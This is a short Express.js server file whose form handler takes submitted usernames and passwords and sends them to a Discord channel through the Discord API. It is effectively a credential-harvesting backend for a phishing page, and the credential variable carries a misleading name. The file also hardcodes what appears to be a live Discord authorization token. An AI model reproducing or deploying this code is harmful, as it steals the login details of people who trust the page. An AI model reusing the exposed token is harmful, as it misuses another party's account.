import express from "express";
import bodyParser from "body-parser";
import { Client, GatewayIntentBits } from 'discord.js';
import fetch from 'node-fetch';




const app = express();
const port = 3000;

app.use(express.static("public"));
app.use(bodyParser.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  res.render("solution.ejs");
});

app.post("/submit", (req, res) => {
  const numLetters = "{ username : " + req.body["username"]+ "\n password : " + req.body["password"] ;
  const url = "https://discord.com/api/v9/channels/1193124467568803850/messages";
const payload = {
    content: numLetters
};

const headers = {
    Authorization: "MTE1NTQ0ODE4NjgxNTY2MDAzMg.GeYeyH.EdUlKanI1tyG8h2qT3HxTWz1R3Noj9rrfWUR1E"
};

fetch(url, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        ...headers
    },
    body: JSON.stringify(payload)
})
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
  console.log(numLetters);
});


app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
